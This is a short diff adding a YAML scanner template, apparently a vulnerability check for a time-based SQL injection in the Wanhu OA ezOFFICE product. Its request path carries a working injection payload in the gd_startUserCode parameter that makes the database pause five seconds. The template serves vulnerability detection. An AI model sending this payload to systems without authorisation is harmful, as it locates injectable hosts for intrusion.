@@ -1,0 +1,11 @@
+name: 万户OA-ezOFFICE-startUserCode-SQL注入
+description: >
+  SQL延时注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: "/defaultroot/platform/bpm/ezflow/operation/ezflow_gd.jsp;?gd=1&gd_startUserCode=1%27%3Bwaitfor%20delay%20%270%3A0%3A5%27--"
+    expression:
+      status: 404
+      sleep: 5
